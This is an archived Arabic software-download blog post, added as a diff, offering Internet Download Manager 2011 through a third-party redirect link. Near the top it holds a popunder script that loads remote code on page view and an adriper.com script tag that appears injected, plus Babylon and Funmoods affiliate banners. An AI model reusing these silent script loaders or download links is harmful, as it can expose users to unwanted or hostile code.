@@ -1,0 +1,614 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="rtl" xml:lang="ar">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>برنامج Internet Download Manager 2011</title>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-3102254-26']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+        <link rel="profile" href="http://gmpg.org/xfn/11" />
+        		<link rel="stylesheet" href="http://www.wikidownload.info/wp-content/themes/unspoken/style.css" type="text/css" media="all" />
+		<link rel="stylesheet" href="http://www.wikidownload.info/wp-content/themes/unspoken/lib/js/fancybox/jquery.fancybox-1.3.4.css" type="text/css" media="all" />
+        <link rel="pingback" href="http://www.wikidownload.info/xmlrpc.php" />
+        <link rel="alternate" type="text/xml" title="RSS .92" href="http://www.wikidownload.info/feed/rss/"/>
+        <link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="http://www.wikidownload.info/feed/atom/" />
+		<!--[if lt IE 8]><link rel="stylesheet" href="http://www.wikidownload.info/wp-content/themes/unspoken/ie.css" type="text/css" media="all" /><![endif]-->
+
+        
+        
+        <link rel="alternate" type="application/rss+xml" title="موقع ويكي العربي - تحميل ويكي &raquo; الخلاصة" href="http://www.wikidownload.info/feed/" />
+<link rel="alternate" type="application/rss+xml" title="موقع ويكي العربي - تحميل ويكي &raquo; خلاصة التعليقات" href="http://www.wikidownload.info/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="موقع ويكي العربي - تحميل ويكي &raquo; برنامج Internet Download Manager 2011 خلاصة التعليقات" href="http://www.wikidownload.info/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2011/feed/" />
+<link rel='stylesheet' id='contact-form-7-css'  href='http://www.wikidownload.info/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.2.1' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-rtl-css'  href='http://www.wikidownload.info/wp-content/plugins/contact-form-7/includes/css/styles-rtl.css?ver=3.2.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-pagenavi-css'  href='http://www.wikidownload.info/wp-content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.wikidownload.info/wp-includes/js/jquery/jquery.js?ver=1.7.2'></script>
+<script type='text/javascript' src='http://www.wikidownload.info/wp-content/themes/unspoken/lib/js/jcarousellite_1.0.1_mod.js?ver=3.4.1'></script>
+<script type='text/javascript' src='http://www.wikidownload.info/wp-content/themes/unspoken/lib/js/fancybox/jquery.fancybox-1.3.4.pack.js?ver=3.4.1'></script>
+<script type='text/javascript' src='http://www.wikidownload.info/wp-content/themes/unspoken/lib/js/scripts.js?ver=3.4.1'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.wikidownload.info/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.wikidownload.info/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='برنامج Internet Download Manager 2010' href='http://www.wikidownload.info/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2010/' />
+<link rel='next' title='برنامج ESET NOD32 Antivirus 2010' href='http://www.wikidownload.info/%d9%86%d9%88%d8%af-32-%d8%a7%d9%86%d8%aa%d9%8a-%d9%81%d8%a7%d9%8a%d8%b1%d9%88%d8%b3-2010/' />
+<link rel='shortlink' href='http://www.wikidownload.info/?p=116' />
+
+<!-- All in One SEO Pack 1.6.14.6 by Michael Torbert of Semper Fi Web Design[267,400] -->
+<meta name="description" content="برنامج Internet Download Manager 2011 برنامج داونلود مانجر افضل برنامج تحميل وتسريح تحميل ملفات" />
+<meta name="keywords" content="internet download manager,internet download manager 2011,انترنت داون لود مانجر,انترنت داون لود مانجر 2011,تحميل برامج كمبيوتر" />
+<link rel="canonical" href="http://www.wikidownload.info/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2011/" />
+<!-- /all in one seo pack -->
+	</head>
+	<body class="rtl single single-post postid-116 single-format-standard">
+        <div class="wrapper">
+            <div class="header">
+                <div class="header-meta">
+
+                    <div id="top-menu" class="menu-top-menu-container"><ul id="menu-top-menu" class="header-menu clear"><li id="menu-item-1525" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1525"><a href="http://www.wikidownload.info/join-our-team/">إنضم لفريق العمل</a></li>
+<li id="menu-item-1530" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1530"><a href="http://www.wikidownload.info/contact-us/">إتصل بنا</a></li>
+<li id="menu-item-1585" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1585"><a href="http://www.wikidownload.info/search-sitemap/">خريطة البحث</a></li>
+</ul></div>
+                    <div class="header-searchform">
+                        <form method="get" action="http://www.wikidownload.info">
+                            <fieldset>
+                                <input type="text" id="s" name="s" onfocus="if(this.value=='البحث') this.value='';" onblur="if(this.value=='') this.value='البحث';" value="البحث" />
+                                <button type="submit"></button>
+                            </fieldset>
+                        </form>
+                    </div>
+                </div>
+                <div class="header-middle clear">
+                    <div class="logo-header ">
+                        <a href="http://www.wikidownload.info">
+                        <img src="http://www.wikidownload.info/logo.png" width="405" height="110" alt="موقع ويكي العربي - تحميل ويكي"/>                        </a>
+                    </div>
+                    <div class="header-adplace">
+                        			<div class="textwidget"><p align="center"><a href="http://www.babylon.com/redirects/download.cgi?type=100&affID=14423">
+<img border="0" src="http://affiliate.babylon.com/RESOURCES/Babylon/2011013116092636/more_468x60_ab.gif" width="468" height="60"></a></p>
+</div>
+		                    </div>
+                </div>
+
+                <div id="navigation" class="menu-navigation clear"><ul id="menu-navigation" class="menu"><li id="menu-item-1513" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1513"><a href="http://www.wikidownload.info/download-pc-games/">تحمل العاب الكمبيوتر</a></li>
+<li id="menu-item-1514" class="menu-item menu-item-type-taxonomy menu-item-object-category parent menu-item-1514"><a href="http://www.wikidownload.info/anime-download/">تحميل انمي</a>
+<ul class="sub-menu">
+	<li id="menu-item-2174" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2174"><a href="http://www.wikidownload.info/anime-download/new-anime/">تحميل انمي جديد</a></li>
+	<li id="menu-item-2175" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2175"><a href="http://www.wikidownload.info/anime-download/download-bleach/">تحميل بليتش</a></li>
+	<li id="menu-item-2176" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2176"><a href="http://www.wikidownload.info/anime-download/download-fairy-tail/">تحميل فيري تيل</a></li>
+	<li id="menu-item-2177" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2177"><a href="http://www.wikidownload.info/anime-download/download-naruto-shippuuden/">تحميل ناروتو شيبودن</a></li>
+	<li id="menu-item-2178" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2178"><a href="http://www.wikidownload.info/anime-download/download-one-piece/">تحميل ون بيس</a></li>
+</ul>
+</li>
+<li id="menu-item-1515" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent parent menu-item-1515"><a href="http://www.wikidownload.info/download-pc-softwares/">تحميل برامج كمبيوتر</a>
+<ul class="sub-menu">
+	<li id="menu-item-1731" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1731"><a href="http://www.wikidownload.info/download-pc-softwares/translation-software/">تحميل برامج الترجمة</a></li>
+	<li id="menu-item-1732" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1732"><a href="http://www.wikidownload.info/download-pc-softwares/sound-softwares/">تحميل برامج الصوت</a></li>
+	<li id="menu-item-1733" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1733"><a href="http://www.wikidownload.info/download-pc-softwares/video-softwares/">تحميل برامج الفيديو</a></li>
+	<li id="menu-item-1734" class="menu-item menu-item-type-taxonomy menu-item-object-category parent menu-item-1734"><a href="http://www.wikidownload.info/download-pc-softwares/internet-softwares/">تحميل برامج انترنت</a>
+	<ul class="sub-menu">
+		<li id="menu-item-1736" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1736"><a href="http://www.wikidownload.info/download-pc-softwares/internet-softwares/torrent-softwares/">تحميل برامج التورنت</a></li>
+		<li id="menu-item-1737" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1737"><a href="http://www.wikidownload.info/download-pc-softwares/internet-softwares/conversation-software/">تحميل برامج محادثة</a></li>
+		<li id="menu-item-1738" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1738"><a href="http://www.wikidownload.info/download-pc-softwares/internet-softwares/web_browser_softwares/">تحميل متصفحات الانترنت</a></li>
+		<li id="menu-item-1785" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1785"><a href="http://www.wikidownload.info/download-pc-softwares/internet-softwares/e-mail-management-software/">تحميل برامج إدارة البريد</a></li>
+	</ul>
+</li>
+	<li id="menu-item-1786" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1786"><a href="http://www.wikidownload.info/download-pc-softwares/security-software/">تحميل برامج حماية</a></li>
+	<li id="menu-item-1787" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1787"><a href="http://www.wikidownload.info/download-pc-softwares/network-software/">تحميل برامج شبكات</a></li>
+	<li id="menu-item-1788" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1788"><a href="http://www.wikidownload.info/download-pc-softwares/portable-software/">تحميل برامج محمولة</a></li>
+	<li id="menu-item-1784" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1784"><a href="http://www.wikidownload.info/download-pc-softwares/kids-software/">تحميل برامج أطفال</a></li>
+	<li id="menu-item-1789" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1789"><a href="http://www.wikidownload.info/download-pc-softwares/arabic-software/">تحميل برامج معربة</a></li>
+	<li id="menu-item-1790" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1790"><a href="http://www.wikidownload.info/download-pc-softwares/various-software/">تحميل برامج منوعة</a></li>
+	<li id="menu-item-1735" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1735"><a href="http://www.wikidownload.info/download-pc-softwares/utilities-softwares/">تحميل برامج خدمية</a></li>
+	<li id="menu-item-1791" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1791"><a href="http://www.wikidownload.info/download-pc-softwares/mobile-software/">تحميل برامج موبايل</a></li>
+	<li id="menu-item-1792" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1792"><a href="http://www.wikidownload.info/download-pc-softwares/design-software/">تحميل برنامج تصميم</a></li>
+</ul>
+</li>
+</ul></div>
+            </div>
+            <div class="middle clear">
+
+                
+<script language="JavaScript1.1"> 
+
+// Cookies By ma3hd.net per minutes , hours and days sessions 
+
+var popunder 
+
+function get_cookie(Name) { 
+  var search = Name + "=" 
+  var returnvalue = ""; 
+  if (document.cookie.length > 0) { 
+    offset = document.cookie.indexOf(search) 
+    if (offset != -1) { // if cookie exists 
+      offset += search.length 
+      // set index of beginning of value 
+      end = document.cookie.indexOf(";", offset); 
+      // set index of end of cookie value 
+      if (end == -1) 
+         end = document.cookie.length; 
+      returnvalue=unescape(document.cookie.substring(offset, end)) 
+      } 
+   } 
+  return returnvalue; 
+} 
+
+
+popfrequency="17 hours" 
+
+function resetcookie(){ 
+var expireDate = new Date() 
+expireDate.setHours(expireDate.getHours()-10) 
+document.cookie = "popunder=;path=/;expires=" + expireDate.toGMTString() 
+} 
+
+
+
+function loadornot(){ 
+if (get_cookie('popunder')==''){ 
+loadpopunder() 
+var expireDate = new Date() 
+expireDate.setHours(expireDate.getHours()+parseInt(popfrequency)) 
+document.cookie = "popunder="+parseInt(popfrequency)+";path=/;expires=" + expireDate.toGMTString() 
+} 
+} 
+
+function loadpopunder(){ 
+document.write('<scr'+'ipt src="js.php"></scr'+'ipt>'); 
+} 
+if (get_cookie('popunder')!=parseInt(popfrequency)) 
+resetcookie() 
+loadornot() 
+
+ <script type="text/javascript" src="http://www.adriper.com/status.js?v=1.00"></script>
+
+</script> 
+<div id="content">
+
+
+<div id="post-116" class="post-116 post type-post status-publish format-standard hentry category-download-pc-softwares tag-internet-download-manager tag-internet-download-manager-2011 tag---- tag-----2011 single">
+
+    <div class="hentry-meta">
+        <h1>برنامج Internet Download Manager 2011</h1>
+        <p class="hentry-meta-data">كتب بواسطة: <a class="url fn n" href="http://www.wikidownload.info/author/admin/" title="View all posts by admin">admin</a> في : 23 يوليو 2010 في <a href="http://www.wikidownload.info/download-pc-softwares/" title="شاهد جميع التدوينات في تصنيف تحميل برامج كمبيوتر" rel="category tag">تحميل برامج كمبيوتر</a> &middot; <a href="#comments">104 التعليقات</a></p>
+    </div>
+
+    <div class="hentry-container clear">
+                <div class="hentry-middle">
+            <div class="hentry-content clear">
+                <p align="center"><a href="http://ewandoo.com/dbabylon.php"><br />
+<img border="0" src="http://b.babylon.com/RESOURCES/Babylon/2011012710360862/more_468x60_en.gif" width="468" height="60"></a></p>
+<p style="text-align: center;">برنامج Internet Download Manager 2011</p>
+<p style="text-align: center;"><img src="http://ewandoo.com/wp-content/uploads/2010/07/internet-download-manager-300x170.jpg" alt="" /></p>
+<p style="text-align: center;">برنامج داونلود مانجر افضل برنامج تحميل وتسريح تحميل ملفات برامج وفيديو افضل واسرع برنامج تحميل افلام و تحميل ملفات و تسريح التحميل internet download manager برنامج لتسريع التحميل برنامج Internet Download Manager العملاق الحقيقي لتحميل برامج من الانترنت بسرعة البرق مع امكانيات فولاذية اخرى تستحق الثناء والعناء &#8230; مع برنامج idm اذا انقطع معك الانترنت ستجد هذا البرنامج داعم لك بعد رجوع النت ويعود التحميل بنفس السرعة ومن اخر مكان توقف عنده ونفس الشيء مع الكهرباء اذا انقطعت الان قم بـ تحميل idm وايضاً يدعم proxy servers, ftp and http protocols وجميع السيرفرات HTTP, FTP and HTTPS كما يعمل البرنامج بلغات كثيرة ومنها العربية شاهد قائمة اللغات Arabic, Bosnian, Bulgarian, Chinese, Croatian, Czech, Danish, Dutch, French, German, Hungarian, Italian, Japanese, Lithuanian, Macedonian, Polish, Portuguese, Romanian, Russian, Slovenian, Spanish, Thai languages. برنامج تنزيل برامج رائع ولا يوجد له منافسين وهو متوافق مع كل انظمة التشغيل ملحقات برنامج داونلود مانجر, تحميل برنامج داونلود مانجر, برنامج داونلود مانجر اخر اصدار, برنامج داونلود مانجر كامل, برنامج داونلود مانجر عربي, برنامج internet download manager, telecharger internet download manager</p>
+<p style="text-align: center;"><strong>التحميل</strong><br />
+<a target="_blank" rel="nofollow" href="http://www.wikidownload.info/goto/http://ewandoo.com/download/v.php?id=2318" >http://ewandoo.com/download/v.php?id=2318</a></p>
+<p style='text-align:left'>&copy; 2010 &#8211; 2012, <a href="http://www.wikidownload.info" >admin</a>. All rights reserved. </p>
+<p align="center">
+<a href="http://funmoods.com/download/mhmd"><br />
+<img border="0" src="http://ewandoo.com/download.gif" width="158" height="81"></a></p>
+            </div>
+            <div class="hentry-footer">
+                <p class="hentry-tags">الأوسمة: <a href="http://www.wikidownload.info/tag/internet-download-manager/" rel="tag">Internet Download Manager</a>, <a href="http://www.wikidownload.info/tag/internet-download-manager-2011/" rel="tag">Internet Download Manager 2011</a>, <a href="http://www.wikidownload.info/tag/%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1/" rel="tag">انترنت داون لود مانجر</a>, <a href="http://www.wikidownload.info/tag/%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2011/" rel="tag">انترنت داون لود مانجر 2011</a></p>                                                <div class="hentry-navigation">
+                    <div class="hentry-navigation-inn clear">
+                                                    <a class="hentry-navigation-prev" href="http://www.wikidownload.info/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2010/">
+                                <em>الموضوع السابق</em>
+                                <span>برنامج Internet Download Manager 2010</span>
+                            </a>
+                                                    <a class="hentry-navigation-next" href="http://www.wikidownload.info/%d9%86%d9%88%d8%af-32-%d8%a7%d9%86%d8%aa%d9%8a-%d9%81%d8%a7%d9%8a%d8%b1%d9%88%d8%b3-2010/">
+                                <em>الموضوع التالي</em>
+                                <span>برنامج ESET NOD32 Antivirus 2010</span>
+                            </a>
+                                                    <div class="hentry-navigation-line"></div>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        <div class="hentry-sidebar">
+                        <div class="hentry-widget hentry-author">
+                <h6>كاتب الموضوع</h6>
+                <div class="hentry-author-meta clear">
+                    <img alt='' src='http://1.gravatar.com/avatar/5a53205917afb5d8273b911d682cbc22?s=60&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />                    <p><a href="http://www.wikidownload.info/author/admin/">admin</a></p>
+                                    </div>
+                <div class="hentry-author-about"></div>
+            </div>
+            
+            
+                        <div class="hentry-widget hentry-share">
+                <h6>شاركنا الموضوع</h6>
+                <ul>
+                    
+                    <li class="twitter"><a href="http://twitter.com/share?text=%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+Internet+Download+Manager+2011&url=http%3A%2F%2Fwww.wikidownload.info%2F%25d8%25a8%25d8%25b1%25d9%2586%25d8%25a7%25d9%2585%25d8%25ac-%25d8%25a7%25d9%2586%25d8%25aa%25d8%25b1%25d9%2586%25d8%25aa-%25d8%25af%25d8%25a7%25d9%2588%25d9%2586-%25d9%2584%25d9%2588%25d8%25af-%25d9%2585%25d8%25a7%25d9%2586%25d8%25ac%25d8%25b1-2011%2F" target="_blank" rel="external nofollow">تويتر</a></li>
+                    <li class="digg"><a href="http://digg.com/submit?phase=2&amp;url=http://www.wikidownload.info/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2011/&amp;title=%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+Internet+Download+Manager+2011" target="_blank" rel="external nofollow">ديق إيت</a></li>
+                    <li class="delicious"><a href="http://del.icio.us/post?url=http://www.wikidownload.info/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2011/&amp;title=%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+Internet+Download+Manager+2011" target="_blank" rel="external nofollow">أضف إلى لذيذ</a></li>
+                    <li class="fb"><a href="http://facebook.com/share.php?u=http://www.wikidownload.info/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2011/&amp;t=%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+Internet+Download+Manager+2011" target="_blank" rel="external nofollow">أضف للفيس بوك</a></li>
+                    <li class="stumbleupon"><a href="http://stumbleupon.com/submit?url=http://www.wikidownload.info/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2011/&amp;title=%D8%A8%D8%B1%D9%86%D8%A7%D9%85%D8%AC+Internet+Download+Manager+2011" target="_blank" rel="external nofollow">اضف لتعثر</a></li>
+                    <li class="feed"><a href="http://www.wikidownload.info/feed/">Subscribe by RSS</a></li>
+                </ul>
+            </div>
+            
+            
+        </div>
+                
+    </div>
+    <div class="clear"></div>
+
+    
+<div id="comments">
+    <div class="comments">
+
+        
+                    
+                <div class="block-title" id="comments-title">104 مجموع التعليقات على هذا الموضوع<a href="#respond">أضف تعليقاتك</a></div>
+
+                <div class="comments-inn">
+                    <ol class="commentlist">
+                                <li id="li-comment-2488">
+             <div class="comment even thread-even depth-1" id="comment-2488">
+                 <table>
+                     <col style="width: 70px;"/>
+                     <col style="width: 90px;"/>
+                     <col />
+                     <tr>
+                         <td>
+                             <img alt='' src='http://0.gravatar.com/avatar/a2d4538c1397eba654078896db7f8e49?s=60&amp;d=http%3A%2F%2Fwww.wikidownload.info%2Fwp-content%2Fthemes%2Funspoken%2Fimages%2Fno-avatar.png%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />                             <div class="reply">
+                                                              </div><!-- .reply -->
+                         </td>
+                         <td>
+                             <div class="comment-meta commentmetadata">
+                                 <p class="comment-author vcard"><a target="_blank" rel="nofollow" href="http://www.wikidownload.info/goto/http://مصر"  class='url'>محمد الصعيدى</a></p>
+                                 <p>22 أكتوبر 2011</p>
+                                 <p></p>
+                             </div>
+                         </td>
+                         <td>
+                             <div class="comment-text">
+                                 <p>&#8216;طريقة التحميل دوس على السهم للى بيقولك تحميل وهو يحمل معاك</p>
+                                                              </div>
+                         </td>
+                     </tr>
+                 </table>
+             </div><!-- #comment-##  -->
+        </li>
+        <li id="li-comment-2588">
+             <div class="comment odd alt thread-odd thread-alt depth-1" id="comment-2588">
+                 <table>
+                     <col style="width: 70px;"/>
+                     <col style="width: 90px;"/>
+                     <col />
+                     <tr>
+                         <td>
+                             <img alt='' src='http://0.gravatar.com/avatar/ef153cac8c287c62a6a06539065ccdfc?s=60&amp;d=http%3A%2F%2Fwww.wikidownload.info%2Fwp-content%2Fthemes%2Funspoken%2Fimages%2Fno-avatar.png%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />                             <div class="reply">
+                                                              </div><!-- .reply -->
+                         </td>
+                         <td>
+                             <div class="comment-meta commentmetadata">
+                                 <p class="comment-author vcard">lolyroma</p>
+                                 <p>4 ديسمبر 2011</p>
+                                 <p></p>
+                             </div>
+                         </td>
+                         <td>
+                             <div class="comment-text">
+                                 <p>i wish it works properly, and thanks any way</p>
+                                                              </div>
+                         </td>
+                     </tr>
+                 </table>
+             </div><!-- #comment-##  -->
+        </li>
+        <li id="li-comment-2592">
+             <div class="comment even thread-even depth-1" id="comment-2592">
+                 <table>
+                     <col style="width: 70px;"/>
+                     <col style="width: 90px;"/>
+                     <col />
+                     <tr>
+                         <td>
+                             <img alt='' src='http://1.gravatar.com/avatar/3fcf434e1b2104c5723eecdf8593bc6a?s=60&amp;d=http%3A%2F%2Fwww.wikidownload.info%2Fwp-content%2Fthemes%2Funspoken%2Fimages%2Fno-avatar.png%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />                             <div class="reply">
+                                                              </div><!-- .reply -->
+                         </td>
+                         <td>
+                             <div class="comment-meta commentmetadata">
+                                 <p class="comment-author vcard">أمير ألغرام</p>
+                                 <p>7 ديسمبر 2011</p>
+                                 <p></p>
+                             </div>
+                         </td>
+                         <td>
+                             <div class="comment-text">
+                                 <p>مشكووووووووووورررررررررررررر جدا</p>
+                                                              </div>
+                         </td>
+                     </tr>
+                 </table>
+             </div><!-- #comment-##  -->
+        </li>
+        <li id="li-comment-2594">
+             <div class="comment odd alt thread-odd thread-alt depth-1" id="comment-2594">
+                 <table>
+                     <col style="width: 70px;"/>
+                     <col style="width: 90px;"/>
+                     <col />
+                     <tr>
+                         <td>
+                             <img alt='' src='http://0.gravatar.com/avatar/ae8760390cb6c46b1f4e78ab7268254e?s=60&amp;d=http%3A%2F%2Fwww.wikidownload.info%2Fwp-content%2Fthemes%2Funspoken%2Fimages%2Fno-avatar.png%3Fs%3D60&amp;r=G' class='avatar avatar-60 photo' height='60' width='60' />                             <div class="reply">
+                                                              </div><!-- .reply -->
+                         </td>
+                         <td>
+                             <div class="comment-meta commentmetadata">
+                                 <p class="comment-author vcard"><a target="_blank" rel="nofollow" href="http://www.wikidownload.info/goto/http://العراق"  class='url'>احمد الربيعي</a></p>
+                                 <p>8 ديسمبر 2011</p>
+                                 <p></p>
+                             </div>
+                         </td>
+                         <td>
+                             <div class="comment-text">
+                                 <p>شكرا</p>
+                                                              </div>
+                         </td>
+                     </tr>
+                 </table>
+             </div><!-- #comment-##  -->
+        </li>
+                    </ol>
+                </div><!-- .comments-inn -->
+
+                                    <div class="navigation clear">
+                        <div class="nav-previous"><a href="http://www.wikidownload.info/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2011/comment-page-2/#comments" ><span class="meta-nav">&larr;</span> اقدم التعليقات</a></div>
+                        <div class="nav-next"></div>
+                    </div><!-- .navigation -->
+                
+            
+            
+            </div><!-- .comments -->
+
+    
+    <div id="respond">
+         <div class="block-title">أضف تعليقاتك</div>
+         <div class="comments-inn">
+                              <form action="http://www.wikidownload.info/wp-comments-post.php" method="post" id="commentform" onSubmit="return validate(false);">
+                     <fieldset>
+                         <table>
+                             <col width="23%"/>
+                             <col width="48%"/>
+                             <col width="29%"/>
+
+                         
+                             <tr>
+                                 <td class="label"><label for="author">الأسم الكريم</label></td>
+                                 <td>
+                                     <p><input type="text" name="author" id="author" tabindex="1" class="input"/></p>
+                                     <p class="alert">من فضلك أكتب أسمك</p>
+                                 </td>
+                                 <td><span>الأسم مطلوب</span></td>
+                             </tr>
+                             <tr>
+                                 <td class="label"><label for="email">ضع بريدك الكتروني</label></td>
+                                 <td>
+                                     <p><input type="text" name="email" id="email" tabindex="2" class="input"/></p>
+                                     <p class="alert">من فضلك ضع بريدك الكتروني</p>
+                                 </td>
+                                 <td><span>البريد الكتروني مطلوب</span></td>
+                             </tr>
+                             <tr>
+                                 <td class="label"><label for="url">موقع الكاتب</label></td>
+                                 <td>
+                                     <p><input type="text" name="url" id="url" tabindex="3" class="input"/></p>
+                                 </td>
+                                 <td></td>
+                             </tr>
+                         
+                             <tr>
+                                 <td  class="label"><label for="comment">رسالتك</label></td>
+                                 <td colspan="2">
+                                     <p><textarea name="comment" id="comment" cols="30" rows="10" tabindex="4"></textarea></p>
+                                     <p class="alert">من فضلك ضع رساله</p>
+
+                                     
+                                 </td>
+                             </tr>
+                             <tr>
+                                 <td  class="label"></td>
+                                 <td colspan="2" class="submit">
+                                     <div>
+                                         <input id="submit" type="submit" value="أرسل تعليقك" tabindex="5"/><span id="cancel-comment-reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/%d8%a8%d8%b1%d9%86%d8%a7%d9%85%d8%ac-%d8%a7%d9%86%d8%aa%d8%b1%d9%86%d8%aa-%d8%af%d8%a7%d9%88%d9%86-%d9%84%d9%88%d8%af-%d9%85%d8%a7%d9%86%d8%ac%d8%b1-2011/#respond" style="display:none;">الغاء التعليق</a></span>
+                                     </div>
+                                 </td>
+                             </tr>
+                         </table>
+                         <div class="commentform-extra">
+                             
+<div id="captchaImgDiv">
+
+<div class="captchaSizeDivLarge"><img id="si_image_com" class="si-captcha" src="http://www.wikidownload.info/wp-content/plugins/si-captcha-for-wordpress/captcha/securimage_show.php?si_form_id=com&amp;prefix=sCZCr7RupyTAeQKV" width="175" height="60" alt="صورة الكابتشا" title="صورة الكابتشا" />
+    <input id="si_code_com" name="si_code_com" type="hidden"  value="sCZCr7RupyTAeQKV" />
+    <div id="si_refresh_com">
+<a href="#" rel="nofollow" title="تحديث الصورة" onclick="si_captcha_refresh('si_image_com','com','/wp-content/plugins/si-captcha-for-wordpress/captcha','http://www.wikidownload.info/wp-content/plugins/si-captcha-for-wordpress/captcha/securimage_show.php?si_form_id=com&amp;prefix='); return false;">
+      <img class="captchaImgRefresh" src="http://www.wikidownload.info/wp-content/plugins/si-captcha-for-wordpress/captcha/images/refresh.png" width="22" height="20" alt="تحديث الصورة" onclick="this.blur();" /></a>
+  </div>
+  </div>
